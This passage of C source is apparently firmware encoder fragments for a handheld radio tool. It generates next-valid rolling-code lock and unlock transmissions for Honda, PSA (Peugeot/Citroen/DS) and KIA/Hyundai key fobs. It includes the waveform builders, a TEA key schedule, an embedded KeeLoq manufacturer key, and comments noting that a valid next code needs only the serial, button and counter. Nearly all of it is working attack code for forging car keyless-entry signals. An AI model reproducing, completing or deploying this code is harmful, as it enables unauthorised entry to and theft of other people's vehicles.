        button = 0U; /* HondaV1ButtonUnlock */
    }

    const uint16_t counter = (uint16_t)(cnt & honda_v1_enc_COUNTER_MASK);
    *out_data = honda_v1_enc_build_key(serial & honda_v1_enc_SERIAL_MASK, button, counter);
    *out_bits = (uint16_t)honda_v1_enc_BIT_COUNT;
    return true;
}

/* Build the AM waveform: preamble short-pairs + dual-CRC repeated frames. */
static size_t honda_v1_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)bits;

    uint8_t frame[honda_v1_enc_FRAME_BYTES] = {0};
    uint8_t first = 0U;
    uint8_t second = 0U;
    size_t index = 0U;

    index = pp_emit_short_pairs(
        up, index, cap, honda_v1_enc_TE_SHORT, honda_v1_enc_PREAMBLE_UPLOAD_COUNT / 2U);
    if(index != honda_v1_enc_PREAMBLE_UPLOAD_COUNT) {
        return 0U;
    }
    up[index - 1U] = level_duration_make(false, honda_v1_enc_FRAME_GAP_US);

    pp_u64_to_bytes_be(data, frame);
    honda_v1_enc_checksum_wire_order(data, &first, &second);

    const uint8_t crc_order[2] = {first, second};
    for(size_t crc_index = 0U; crc_index < 2U; crc_index++) {
        frame[honda_v1_enc_FRAME_CRC_INDEX] = (uint8_t)(crc_order[crc_index] << 4U);
        for(size_t repeat = 0U; repeat < honda_v1_enc_FRAME_REPEAT_PER_CRC; repeat++) {
            if(!honda_v1_enc_append_frame(up, cap, &index, frame)) {
                return 0U;
            }
        }
    }

    return index;
}

static const bool honda_v1_enc_is_fsk = false;

static size_t honda_v1_enc_next(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    LevelDuration* up,
    size_t cap) {
    uint64_t data = 0U;
    uint16_t bits = 0U;
    if(!honda_v1_enc_build(serial, btn, cnt, &data, &bits)) {
        return 0U;
    }
    return honda_v1_enc_upload(data, bits, up, cap);
}

/* ======================================================================
 * Honda V2  --  ProtoPirate encoder (GPLv3)
 *   Modulation: FM (is_fsk = true)
 *   Rolling code: 9-bit counter, 81-bit frame, transition Manchester.
 *   Only Lock / Unlock buttons carry a known command signature.
 * ====================================================================== */

#define honda_v2_enc_TE_SHORT       250U
#define honda_v2_enc_TE_LONG        500U
#define honda_v2_enc_SYNC_US        750U
#define honda_v2_enc_GAP_US         50000U
#define honda_v2_enc_UPLOAD_CAPACITY 1024U
#define honda_v2_enc_PREAMBLE_PAIRS 319U
#define honda_v2_enc_BIT_COUNT      81U
#define honda_v2_enc_BTN_LOCK       0x02U
#define honda_v2_enc_BTN_UNLOCK     0x04U
#define honda_v2_enc_SIG_UNLOCK     0xA285E3UL
#define honda_v2_enc_SIG_LOCK       0xC20363UL

static uint32_t honda_v2_enc_signature_from_button(uint8_t button) {
    switch(button) {
    case honda_v2_enc_BTN_LOCK:
        return honda_v2_enc_SIG_LOCK;
    case honda_v2_enc_BTN_UNLOCK:
        return honda_v2_enc_SIG_UNLOCK;
    default:
        return 0U;
    }
}

static uint8_t honda_v2_enc_calculate_check(uint32_t count) {
    const uint8_t c0 =
        ((count >> 1) ^ (count >> 2) ^ (count >> 3) ^ (count >> 4) ^ (count >> 6)) & 1U;
    const uint8_t c1 = ((count >> 0) ^ (count >> 2) ^ (count >> 3) ^ (count >> 4) ^ (count >> 5) ^
                        (count >> 6) ^ 1U) &
                       1U;
    const uint8_t c2 =
        ((count >> 1) ^ (count >> 3) ^ (count >> 4) ^ (count >> 5) ^ (count >> 6)) & 1U;

    return (uint8_t)(c0 | (c1 << 1) | (c2 << 2));
}

static bool honda_v2_enc_calculate_tail_msb(uint32_t count) {
    const uint8_t tail = ((count >> 0) ^ (count >> 2) ^ (count >> 4) ^ (count >> 5)) & 1U;
    return tail != 0U;
}

static uint16_t honda_v2_enc_calculate_tail(uint32_t count) {
    return honda_v2_enc_calculate_tail_msb(count) ? 0xFFFFU : 0x7FFFU;
}

static uint64_t honda_v2_enc_build_key(uint32_t signature, uint32_t serial, uint32_t count) {
    uint8_t key_bytes[8] = {0};
    key_bytes[0] = (uint8_t)((signature >> 16) & 0xFFU);
    key_bytes[1] = (uint8_t)((signature >> 8) & 0xFFU);
    key_bytes[2] = (uint8_t)(signature & 0xFFU);
    key_bytes[3] = (uint8_t)((serial >> 16) & 0xFFU);
    key_bytes[4] = (uint8_t)((serial >> 8) & 0xFFU);
    key_bytes[5] = (uint8_t)(serial & 0xFFU);
    key_bytes[6] = (uint8_t)((count >> 1) & 0xFFU);

    const bool counter_lsb = (count & 1U) != 0U;
    const uint8_t check = honda_v2_enc_calculate_check(count);
    key_bytes[7] = (uint8_t)((counter_lsb ? 0x80U : 0x00U) | check);

    return pp_bytes_to_u64_be(key_bytes);
}

static bool honda_v2_enc_add_level(
    LevelDuration* up,
    size_t cap,
    size_t* index,
    bool level,
    uint32_t duration) {
    if(*index >= cap) {
        return false;
    }
    up[(*index)++] = level_duration_make(level, duration);
    return true;
}

static bool honda_v2_enc_add_bit(
    LevelDuration* up,
    size_t cap,
    size_t* index,
    bool* previous_bit,
    bool bit) {
    const uint32_t te_short = honda_v2_enc_TE_SHORT;
    const uint32_t te_long = honda_v2_enc_TE_LONG;

    if(!*previous_bit && !bit) {
        if(!honda_v2_enc_add_level(up, cap, index, true, te_short) ||
           !honda_v2_enc_add_level(up, cap, index, false, te_short)) {
            return false;
        }
    } else if(!*previous_bit && bit) {
        if(!honda_v2_enc_add_level(up, cap, index, true, te_long)) {
            return false;
        }
    } else if(*previous_bit && !bit) {
        if(!honda_v2_enc_add_level(up, cap, index, false, te_long)) {
            return false;
        }
    } else {
        if(!honda_v2_enc_add_level(up, cap, index, false, te_short) ||
           !honda_v2_enc_add_level(up, cap, index, true, te_short)) {
            return false;
        }
    }

    *previous_bit = bit;
    return true;
}

/* Reconstruct the 81-bit frame from serial/btn/cnt (cnt already incremented).
 * Returns false when the button is not Lock/Unlock: only those two carry a
 * known command signature (an unknown button would need a captured BtnSig). */
static bool honda_v2_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    const uint32_t signature = honda_v2_enc_signature_from_button(btn);
    if(signature == 0U) {
        return false; /* unknown button: needs a known command signature */
    }

    *out_data = honda_v2_enc_build_key(signature, serial & 0xFFFFFFU, cnt & 0x1FFU);
    *out_bits = (uint16_t)honda_v2_enc_BIT_COUNT;
    return true;
}

/* Build the FM waveform: short-pair preamble, sync, transition-coded data. */
static size_t honda_v2_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)bits;

    size_t index = 0U;
    const uint32_t te_short = honda_v2_enc_TE_SHORT;

    uint8_t key_bytes[8];
    pp_u64_to_bytes_be(data, key_bytes);

    for(uint16_t i = 0U; i < honda_v2_enc_PREAMBLE_PAIRS; i++) {
        if(!honda_v2_enc_add_level(up, cap, &index, true, te_short) ||
           !honda_v2_enc_add_level(up, cap, &index, false, te_short)) {
            return 0U;
        }
    }

    if(!honda_v2_enc_add_level(up, cap, &index, true, honda_v2_enc_SYNC_US) ||
       !honda_v2_enc_add_level(up, cap, &index, false, honda_v2_enc_SYNC_US) ||
       !honda_v2_enc_add_level(up, cap, &index, true, te_short)) {
        return 0U;
    }

    bool previous_bit = true;
    if(!honda_v2_enc_add_bit(up, cap, &index, &previous_bit, false)) {
        return 0U;
    }

    for(uint8_t bit_index = 2U; bit_index < 64U; bit_index++) {
        const uint8_t byte_index = bit_index / 8U;
        const uint8_t bit_in_byte = 7U - (bit_index % 8U);
        const bool bit = (key_bytes[byte_index] >> bit_in_byte) & 1U;
        if(!honda_v2_enc_add_bit(up, cap, &index, &previous_bit, bit)) {
            return 0U;
        }
    }

    const uint32_t count = ((uint32_t)key_bytes[6] << 1) | ((key_bytes[7] >> 7) & 1U);
    const uint16_t tail = honda_v2_enc_calculate_tail(count);
    for(uint8_t bit_index = 0U; bit_index < 16U; bit_index++) {
        const bool bit = (tail >> (15U - bit_index)) & 1U;
        if(!honda_v2_enc_add_bit(up, cap, &index, &previous_bit, bit)) {
            return 0U;
        }
    }

    if(!honda_v2_enc_add_bit(up, cap, &index, &previous_bit, true)) {
        return 0U;
    }

    if(!honda_v2_enc_add_level(up, cap, &index, false, honda_v2_enc_GAP_US)) {
        return 0U;
    }

    return index;
}

static const bool honda_v2_enc_is_fsk = true;

static size_t honda_v2_enc_next(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    LevelDuration* up,
    size_t cap) {
    uint64_t data = 0U;
    uint16_t bits = 0U;
    if(!honda_v2_enc_build(serial, btn, cnt, &data, &bits)) {
        return 0U;
    }
    return honda_v2_enc_upload(data, bits, up, cap);
}

/* ======================================================================
 * Honda Static  --  ProtoPirate encoder (GPLv3)
 *   Modulation: FM (is_fsk = true)
 *   STATIC code: no rolling counter. The 24-bit "counter" field is a fixed
 *   part of the captured key, so cnt is packed as-is (not auto-incremented).
 *   64-bit Manchester frame, XOR checksum.
 * ====================================================================== */

#define honda_static_enc_BIT_COUNT       64U
#define honda_static_enc_SYNC_TIME_US    700U
#define honda_static_enc_ELEMENT_TIME_US 63U
#define honda_static_enc_PREAMBLE_ALT    160U
#define honda_static_enc_UPLOAD_CAPACITY \
    (1U + honda_static_enc_PREAMBLE_ALT + (2U * honda_static_enc_BIT_COUNT) + 1U)

typedef struct {
    uint8_t button;
    uint32_t serial;
    uint32_t counter;
} honda_static_enc_fields_t;

static const uint8_t honda_static_enc_button_map[4] = {0x02U, 0x04U, 0x08U, 0x05U};

static bool honda_static_enc_is_valid_button(uint8_t button) {
    if(button > 9U) {
        return false;
    }
    return ((0x336U >> button) & 1U) != 0U;
}

static uint8_t honda_static_enc_remap_button(uint8_t button) {
    if(button < 2U) {
        return 1U;
    }
    button -= 2U;
    if(button <= 3U) {
        return honda_static_enc_button_map[button];
    }
    return 1U;
}

static void honda_static_enc_set_bits(uint8_t* data, uint8_t start, uint8_t count, uint32_t value) {
    for(uint8_t i = 0U; i < count; i++) {
        const uint8_t bit_index = start + i;
        const uint8_t byte_index = bit_index >> 3U;
        const uint8_t shift = ((uint8_t)~bit_index) & 0x07U;
        const uint8_t mask = (uint8_t)(1U << shift);
        const bool bit = ((value >> (count - 1U - i)) & 1U) != 0U;

        if(bit) {
            data[byte_index] |= mask;
        } else {
            data[byte_index] &= (uint8_t)~mask;
        }
    }
}

static void honda_static_enc_unpack_compact(uint64_t key, honda_static_enc_fields_t* fields) {
    uint8_t compact[8];
    pp_u64_to_bytes_be(key, compact);

    fields->button = compact[0] & 0x0FU;
    fields->serial = ((uint32_t)compact[1] << 20U) | ((uint32_t)compact[2] << 12U) |
                     ((uint32_t)compact[3] << 4U) | ((uint32_t)compact[4] >> 4U);
    fields->counter = ((uint32_t)compact[5] << 16U) | ((uint32_t)compact[6] << 8U) |
                      (uint32_t)compact[7];
}

static uint64_t honda_static_enc_pack_compact(const honda_static_enc_fields_t* fields) {
    uint8_t compact[8];

    compact[0] = fields->button & 0x0FU;
    compact[1] = (uint8_t)(fields->serial >> 20U);
    compact[2] = (uint8_t)(fields->serial >> 12U);
    compact[3] = (uint8_t)(fields->serial >> 4U);
    compact[4] = (uint8_t)(fields->serial << 4U);
    compact[5] = (uint8_t)(fields->counter >> 16U);
    compact[6] = (uint8_t)(fields->counter >> 8U);
    compact[7] = (uint8_t)fields->counter;

    return pp_bytes_to_u64_be(compact);
}

static void
    honda_static_enc_build_packet_bytes(const honda_static_enc_fields_t* fields, uint8_t packet[8]) {
    for(size_t i = 0U; i < 8U; i++) {
        packet[i] = 0U;
    }

    honda_static_enc_set_bits(packet, 0U, 4U, fields->button & 0x0FU);
    honda_static_enc_set_bits(packet, 4U, 28U, fields->serial);
    honda_static_enc_set_bits(packet, 32U, 24U, fields->counter);

    uint8_t checksum = 0U;
    for(size_t i = 0U; i < 7U; i++) {
        checksum ^= packet[i];
    }

    honda_static_enc_set_bits(packet, 56U, 8U, checksum);
}

/* Build the fixed 64-bit static frame from serial/btn (+ the captured 24-bit
 * counter field, which does not roll). No secret key required. */
static bool honda_static_enc_build(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    uint64_t* out_data,
    uint16_t* out_bits) {
    honda_static_enc_fields_t fields;
    fields.serial = serial;

    uint8_t b = (uint8_t)btn;
    if(honda_static_enc_is_valid_button(b)) {
        fields.button = b;
    } else if((b >= 2U) && (b <= 5U)) {
        fields.button = honda_static_enc_remap_button(b);
    } else {
        fields.button = b;
    }

    fields.counter = cnt & 0x00FFFFFFU;

    *out_data = honda_static_enc_pack_compact(&fields);
    *out_bits = (uint16_t)honda_static_enc_BIT_COUNT;
    return true;
}

/* Build the FM waveform: long sync, alternating preamble, Manchester data. */
static size_t honda_static_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    (void)bits;

    honda_static_enc_fields_t fields;
    honda_static_enc_unpack_compact(data, &fields);

    uint8_t packet[8];
    honda_static_enc_build_packet_bytes(&fields, packet);

    size_t index = 0U;

    index = pp_emit(up, index, cap, true, honda_static_enc_SYNC_TIME_US);

    for(size_t i = 0U; i < honda_static_enc_PREAMBLE_ALT; i++) {
        index = pp_emit(up, index, cap, (i & 1U) != 0U, honda_static_enc_ELEMENT_TIME_US);
    }

    for(uint8_t bit = 0U; bit < honda_static_enc_BIT_COUNT; bit++) {
        const bool value = ((packet[bit >> 3U] >> (((uint8_t)~bit) & 0x07U)) & 1U) != 0U;
        index = pp_emit(up, index, cap, !value, honda_static_enc_ELEMENT_TIME_US);
        index = pp_emit(up, index, cap, value, honda_static_enc_ELEMENT_TIME_US);
    }

    const bool last_bit = (packet[7] & 1U) != 0U;
    index = pp_emit(up, index, cap, !last_bit, honda_static_enc_SYNC_TIME_US);

    return index;
}

static const bool honda_static_enc_is_fsk = true;

static size_t honda_static_enc_next(
    uint32_t serial,
    uint8_t btn,
    uint32_t cnt,
    LevelDuration* up,
    size_t cap) {
    uint64_t data = 0U;
    uint16_t bits = 0U;
    if(!honda_static_enc_build(serial, btn, cnt, &data, &bits)) {
        return 0U;
    }
    return honda_static_enc_upload(data, bits, up, cap);
}

/* ======================================================================
 * ProtoPirate encoder (GPLv3) -- summary
 *
 *   honda_v1_enc_next
 *     is_fsk      : false (AM, 315/433)
 *     cap (min)   : 2048 LevelDuration entries
 *     limitation  : none -- rebuilds 68-bit frame + dual CRC from
 *                   serial/btn/cnt; caller passes cnt already incremented.
 *
 *   honda_v2_enc_next
 *     is_fsk      : true (FM, 315/433)
 *     cap (min)   : 1024 LevelDuration entries
 *     limitation  : only Lock (btn 0x02) / Unlock (btn 0x04) supported;
 *                   any other button returns 0 (no known command signature).
 *                   Caller passes cnt already incremented (9-bit counter).
 *
 *   honda_static_enc_next
 *     is_fsk      : true (FM, 315/433)
 *     cap (min)   : 290 LevelDuration entries
 *     limitation  : STATIC code -- no rolling counter; cnt is packed as the
 *                   fixed 24-bit key field, not auto-incremented.
 *
 *   All three protocols have real pp_emit-based waveform builders in the
 *   ProtoPirate source; none was an encoder stub, so all were ported.
 * ====================================================================== */


// --- pp_enc_psa.h ---
/* ================================================================
 * PSA encoder — ProtoPirate (GPLv3)
 * ----------------------------------------------------------------
 * Self-contained next-rolling-code TX path for the PSA
 * (Peugeot / Citroen / DS) 128-bit dynamic protocol.
 *
 * Ported from ProtoPirate protocols/psa.c (#if PROTOPIRATE_WITH_ENCODER)
 * and protocols/psa_crypto.c  (GPLv3).
 *
 * COLLISION SAFETY: the firmware's PSA DECODER already defines
 *   psa_crypto_bf1_key_schedule / psa_crypto_bf2_key_schedule /
 *   psa_crypto_setup_byte_buffer / psa_crypto_prepare_tea_data /
 *   psa_crypto_tea_crc / psa_crypto_crc16_bf2 /
 *   psa_crypto_unpack_tea_result_to_buffer / TEA_DELTA / TEA_ROUNDS /
 *   PSA_* macros / psa_const.
 * NONE of those are referenced here. Every symbol emitted below is a
 * PRIVATE copy carrying the `psa_enc_` / `PSA_ENC_` prefix, so this
 * fragment can be dropped in alongside the decoder with zero
 * redefinition.
 *
 * Depends only on the shared ENCODER SHIM already in the firmware:
 *   LevelDuration / level_duration_make (rest of the shim is unused here).
 *
 * No #include / no #pragma once — paste inside a TU that already has
 * the shim + <stdint.h>/<stddef.h>/<stdbool.h> visible.
 * ================================================================ */

/* ---- private TEA constants (copies of TEA_DELTA / TEA_ROUNDS) ---- */
#define PSA_ENC_TEA_DELTA  0x9E3779B9U
#define PSA_ENC_TEA_ROUNDS 32

/* ---- private BF1 constants (copies of PSA_CRYPTO_BF1_*) ---- */
#define PSA_ENC_BF1_CONST_U4 0x0E0F5C41U
#define PSA_ENC_BF1_CONST_U5 0x0F5C4123U
#define PSA_ENC_BF1_START    0x23000000U

/* ---- private waveform constants ---- */
#define PSA_ENC_TE       250U /* short element (OG PSA_TE_LONG_250 = 0xfa) */
#define PSA_ENC_TE_LONG  500U /* transition long (OG const.te_long)        */
#define PSA_ENC_TE_END   1000U /* frame terminator (OG PSA_TE_END_1000)    */
#define PSA_ENC_PREAMBLE_PAIRS 80
#define PSA_ENC_CAPACITY 325U /* 80*2 + 3 + 64*2 + 16*2 + 2 = 325          */

/* ---- private key schedule (copy of psa_crypto_bf1_key_schedule) ----
 * Only BF1 is used by the TX path ported here (mode 0x36 / TEA); the
 * BF2 schedule from the decoder side is intentionally NOT duplicated
 * because nothing here references it. */
static const uint32_t psa_enc_bf1_key_schedule[4] = {
    0x4A434915U,
    0xD6743C2BU,
    0x1F29D308U,
    0xE6B79A64U,
};

/* Carries the 16-bit Key2 / ValidationField that rides on-air after the
 * 64-bit Key1. psa_enc_build() writes it; psa_enc_upload() reads it.
 * Module-static so the two-argument upload signature required by the
 * task does not have to thread a second data word. */
static uint16_t psa_enc_key2_carry = 0;

/* ---- private TEA block cipher (copy of psa_crypto_tea_encrypt) ---- */
static void psa_enc_tea_encrypt(uint32_t* v0, uint32_t* v1, const uint32_t* key) {
    uint32_t sum = 0;
    for(int i = 0; i < PSA_ENC_TEA_ROUNDS; i++) {
        uint32_t k_idx1 = sum & 3;
        uint32_t temp = key[k_idx1] + sum;
        sum = sum + PSA_ENC_TEA_DELTA;
        *v0 = *v0 + (temp ^ (((*v1 >> 5) ^ (*v1 << 4)) + *v1));
        uint32_t k_idx2 = (sum >> 11) & 3;
        temp = key[k_idx2] + sum;
        *v1 = *v1 + (temp ^ (((*v0 >> 5) ^ (*v0 << 4)) + *v0));
    }
}

/* ---- private CRC over the packed TEA words (copy of psa_crypto_tea_crc) ---- */
static uint8_t psa_enc_tea_crc(uint32_t v0, uint32_t v1) {
    uint32_t crc = ((v0 >> 24) & 0xFF) + ((v0 >> 16) & 0xFF) + ((v0 >> 8) & 0xFF) + (v0 & 0xFF);
    crc += ((v1 >> 24) & 0xFF) + ((v1 >> 16) & 0xFF) + ((v1 >> 8) & 0xFF);
    return (uint8_t)(crc & 0xFF);
}

/* ---- private TEA-result unpack (copy of psa_crypto_unpack_tea_result_to_buffer) ---- */
static void psa_enc_unpack_tea_result_to_buffer(uint8_t* buffer, uint32_t v0, uint32_t v1) {
    buffer[2] = (uint8_t)((v0 >> 24) & 0xFF);
    buffer[3] = (uint8_t)((v0 >> 16) & 0xFF);
    buffer[4] = (uint8_t)((v0 >> 8) & 0xFF);
    buffer[5] = (uint8_t)(v0 & 0xFF);
    buffer[6] = (uint8_t)((v1 >> 24) & 0xFF);
    buffer[7] = (uint8_t)((v1 >> 16) & 0xFF);
    buffer[8] = (uint8_t)((v1 >> 8) & 0xFF);
    buffer[9] = (uint8_t)(v1 & 0xFF);
}

/* From the source protocol flags (SubGhzProtocolFlag_AM | _FM both set):
 * the on-air framing here is OOK / Manchester carrier-on/carrier-off
 * (level-duration pairs, low-carrier 1000us terminator) => AM/ASK.
 * The `.flag` field also advertises FM, so PSA can be received either
 * way, but the ported waveform is amplitude-keyed, hence is_fsk = false. */
static const bool psa_enc_is_fsk = false;

/* ----------------------------------------------------------------
 * psa_enc_build — reconstruct the PSA plaintext from serial/btn/cnt
 * and TEA-encrypt it (mode 0x36 path) to produce the on-air 64-bit
 * Key1 frame + its bit length. The 16-bit Key2 / ValidationField is
 * carried out-of-band via psa_enc_key2_carry (see above).
 *
 * Mode 0x36 computes its own CRC and derives the two preamble bytes
 * (buffer[0..1]) from the ciphertext, so a valid next code is produced
 * from serial/btn/cnt ALONE — no recovered seed/key2 required. Returns
 * true always (the TEA path cannot fail on well-formed inputs).
 * ---------------------------------------------------------------- */
static bool psa_enc_build(uint32_t serial, uint8_t btn, uint32_t cnt, uint64_t* out_data,
                          uint16_t* out_bits) {
    if(out_data == NULL || out_bits == NULL) return false;

    uint8_t buffer[16] = {0};

    /* Pack plaintext exactly as psa_build_buffer_mode36():
     * v0 = serial(24) | btn(4) | counter[27:24](4)
     * v1 = counter[23:0](24) | crc(8)  (crc placeholder, filled below) */
    uint32_t v0 = ((serial & 0xFFFFFF) << 8) | ((uint32_t)(btn & 0xF) << 4) | ((cnt >> 24) & 0xF);
    uint32_t v1 = ((cnt & 0xFFFFFF) << 8) | 0x00U;

    uint8_t crc = psa_enc_tea_crc(v0, v1);
    v1 = (v1 & 0xFFFFFF00U) | crc;

    /* Derive the per-frame working key from the BF1 schedule + serial. */
    uint32_t bf_counter = PSA_ENC_BF1_START | (serial & 0xFFFFFF);

    uint32_t working_key[4];

    uint32_t wk2 = PSA_ENC_BF1_CONST_U4;
    uint32_t wk3 = bf_counter;
    psa_enc_tea_encrypt(&wk2, &wk3, psa_enc_bf1_key_schedule);

    uint32_t wk0 = (bf_counter << 8) | 0x0EU;
    uint32_t wk1 = PSA_ENC_BF1_CONST_U5;
    psa_enc_tea_encrypt(&wk0, &wk1, psa_enc_bf1_key_schedule);

    working_key[0] = wk0;
    working_key[1] = wk1;
    working_key[2] = wk2;
    working_key[3] = wk3;

    psa_enc_tea_encrypt(&v0, &v1, working_key);
    psa_enc_unpack_tea_result_to_buffer(buffer, v0, v1);

    /* No original Key1 to preserve => derive the two preamble bytes
     * (mirrors the FlipperFormat-less fallback in the OG encoder). */
    buffer[0] = buffer[2] ^ buffer[6];
    buffer[1] = buffer[3] ^ buffer[7];

    uint32_t key1_high = ((uint32_t)buffer[0] << 24) | ((uint32_t)buffer[1] << 16) |
                         ((uint32_t)buffer[2] << 8) | (uint32_t)buffer[3];
    uint32_t key1_low = ((uint32_t)buffer[4] << 24) | ((uint32_t)buffer[5] << 16) |
                        ((uint32_t)buffer[6] << 8) | (uint32_t)buffer[7];
    uint16_t validation_field = ((uint16_t)buffer[8] << 8) | (uint16_t)buffer[9];

    *out_data = ((uint64_t)key1_high << 32) | (uint64_t)key1_low;
    *out_bits = 64;
    psa_enc_key2_carry = validation_field;
    return true;
}

/* ----------------------------------------------------------------
 * psa_enc_upload — port of psa_encoder_build_upload()'s waveform
 * builder. Emits, into up[0..cap):
 *   - 80 short Manchester preamble pairs
 *   - a (false,short)(true,long)(false,short) transition
 *   - `bits` bits of `data`, MSB first, Manchester (1 => hi/lo, 0 => lo/hi)
 *   - 16 bits of psa_enc_key2_carry, MSB first, same Manchester
 *   - a (true,end)(false,end) terminator
 * Returns the number of LevelDuration entries written (0 if cap too small).
 * ---------------------------------------------------------------- */
static size_t psa_enc_upload(uint64_t data, uint16_t bits, LevelDuration* up, size_t cap) {
    if(up == NULL || cap < PSA_ENC_CAPACITY) return 0;

    size_t index = 0;
    const uint32_t te = PSA_ENC_TE;

    /* Preamble: 80 pairs of (hi,short)(lo,short). */
    for(int i = 0; i < PSA_ENC_PREAMBLE_PAIRS; i++) {
        if(index >= cap - 2) break;
        up[index++] = level_duration_make(true, te);
        up[index++] = level_duration_make(false, te);
    }

    /* Sync transition. */
    if(index < cap - 3) {
        up[index++] = level_duration_make(false, te);
        up[index++] = level_duration_make(true, PSA_ENC_TE_LONG);
        up[index++] = level_duration_make(false, te);
    }

    /* `bits` bits of Key1 data, MSB first. */
    for(int bit = (int)bits - 1; bit >= 0; bit--) {
        if(index >= cap - 2) break;
        bool bit_value = (data >> bit) & 1U;
        if(bit_value) {
            up[index++] = level_duration_make(true, te);
            up[index++] = level_duration_make(false, te);
        } else {
            up[index++] = level_duration_make(false, te);
            up[index++] = level_duration_make(true, te);
        }
    }

    /* 16 bits of Key2 / ValidationField carry, MSB first. */
    for(int bit = 15; bit >= 0; bit--) {
        if(index >= cap - 2) break;
        bool bit_value = (psa_enc_key2_carry >> bit) & 1U;
        if(bit_value) {
            up[index++] = level_duration_make(true, te);
            up[index++] = level_duration_make(false, te);
        } else {
            up[index++] = level_duration_make(false, te);
            up[index++] = level_duration_make(true, te);
        }
    }

    /* Terminator. */
    if(index < cap - 1) {
        up[index++] = level_duration_make(true, PSA_ENC_TE_END);
        up[index++] = level_duration_make(false, PSA_ENC_TE_END);
    }

    return index;
}

/* ----------------------------------------------------------------
 * psa_enc_next — build + upload. Produces the next rolling-code frame
 * (mode 0x36 / TEA) from serial/btn/cnt. `cnt` is caller-incremented.
 * Returns the pulse (LevelDuration) count, 0 on failure.
 * ---------------------------------------------------------------- */
static size_t psa_enc_next(uint32_t serial, uint8_t btn, uint32_t cnt, LevelDuration* up,
                           size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    if(!psa_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    return psa_enc_upload(data, bits, up, cap);
}

/* ----------------------------------------------------------------
 * psa_enc_next_with_key2 — same as psa_enc_next but pins the on-air
 * 16-bit Key2 / ValidationField to a caller-supplied value (its low
 * 16 bits) instead of the TEA-derived one. The TEA (mode 0x36) path
 * does NOT need key2 to generate a valid next code — this override is
 * only for callers who captured the genuine Key2 and want it emitted
 * verbatim. Returns pulse count, 0 on failure.
 * ---------------------------------------------------------------- */
static size_t psa_enc_next_with_key2(uint32_t serial, uint8_t btn, uint32_t cnt, uint32_t key2,
                                     LevelDuration* up, size_t cap) {
    uint64_t data = 0;
    uint16_t bits = 0;
    if(!psa_enc_build(serial, btn, cnt, &data, &bits)) return 0;
    psa_enc_key2_carry = (uint16_t)(key2 & 0xFFFFU);
    return psa_enc_upload(data, bits, up, cap);
}

/* ================================================================
 * TRAILING NOTES
 * ----------------------------------------------------------------
 * Entry point:    psa_enc_next(serial, btn, cnt, up, cap)
 *                 (alt: psa_enc_next_with_key2(...) to pin Key2)
 * is_fsk:         false  (psa_enc_is_fsk — OOK/Manchester AM framing;
 *                 the source .flag also advertises FM, so PSA is
 *                 receivable either way, but the emitted waveform is
 *                 amplitude-keyed).
 * cap (required): 325 LevelDuration entries (PSA_ENC_CAPACITY).
 *                 psa_enc_upload / psa_enc_next return 0 if cap < 325.
 *
 * Inputs a valid next code needs:
 *   serial / btn / cnt  ONLY.
 *   The ported path is mode 0x36 (TEA): it computes its own CRC via
 *   psa_enc_tea_crc, derives the per-frame working key from the BF1
 *   schedule + serial, TEA-encrypts, and derives the two preamble
 *   bytes (buffer[0..1]) from the ciphertext. No recovered seed and no
 *   Key2 are required to produce the next code. (Caveat, for full
 *   honesty: the decoder's genuine-frame gate wants low-nibble(buffer[1])
 *   == 0xA; the OG encoder only guarantees that byte when it can preserve
 *   buffer[0..1] from a captured Key1. The synthetic derivation used here
 *   matches the OG's no-original-Key1 fallback, so a purely-synthetic
 *   frame may differ in those two preamble bytes from a captured one.
 *   psa_enc_next_with_key2 lets a caller pin the captured Key2 verbatim.)
 *
 * Collision safety: ALL emitted symbols are `psa_enc_` / `PSA_ENC_`
 * prefixed — psa_enc_bf1_key_schedule, psa_enc_key2_carry,
 * psa_enc_tea_encrypt, psa_enc_tea_crc,
 * psa_enc_unpack_tea_result_to_buffer, psa_enc_is_fsk, psa_enc_build,
 * psa_enc_upload, psa_enc_next, psa_enc_next_with_key2, and macros
 * PSA_ENC_TEA_DELTA / PSA_ENC_TEA_ROUNDS / PSA_ENC_BF1_CONST_U4 /
 * PSA_ENC_BF1_CONST_U5 / PSA_ENC_BF1_START / PSA_ENC_TE /
 * PSA_ENC_TE_LONG / PSA_ENC_TE_END / PSA_ENC_PREAMBLE_PAIRS /
 * PSA_ENC_CAPACITY. None of the decoder-side psa_crypto_* / TEA_* /
 * PSA_* / psa_const symbols are referenced or redefined.
 * ================================================================ */


// --- pp_enc_arf_kia345.h ---
// ============================================================================
//  pp_enc_arf_kia345.h
//  Self-contained ENCODER (next-rolling-code TX) fragment for the
//  Flipper-ARF KIA/HYU car-key protocols V3/V4 (KeeLoq) and V5 (mixer).
//  Flipper-ARF encoder (GPL, embedded key).
//
//  Depends ONLY on the encoder shim already provided by the firmware
//  (protopirate_port.h): LevelDuration, level_duration_make, pp_emit,
//  subghz_protocol_blocks_reverse_key, pp_reverse_bits8, etc.
//
//  COLLISION-SAFETY: the DECODER side already defines KIA_MF_KEY,
//  subghz_protocol_keeloq_common_decrypt, KEELOQ_NLF, kia_v5_keystore_bytes,
//  kia_v5_mixer_decode and each protocol's <p>_const/#defines. To avoid ANY
//  redefinition, EVERYTHING emitted here (keys, crypto, constants, statics) is
//  a PRIVATE copy carrying an <p>_enc_ prefix. No bare KIA_MF_KEY / keeloq /
//  keystore names are referenced or redefined.
//
//  No #include / no #pragma once — include this AFTER protopirate_port.h.
// ============================================================================

// ============================================================================
//  Banner: KIA/HYU V3/V4  (prefix: kia_v3v4_enc_)  --  KeeLoq, embedded MF key
//  Flipper-ARF encoder (GPL, embedded key)
// ============================================================================

// --- Embedded manufacturer key (private copy of KIA_MF_KEY) -----------------
static const uint64_t kia_v3v4_enc_mf_key = 0xA8F5DFFC8DAA5CDBULL;

// --- Private KeeLoq NLF (private copy of KEELOQ_NLF) -------------------------
static const uint32_t kia_v3v4_enc_nlf = 0x3A5C742EUL;

// --- Timing / frame constants (private copies of subghz_protocol_kia_v3_v4_const
//     and the KIA_V3_V4_* #defines) ---------------------------------------
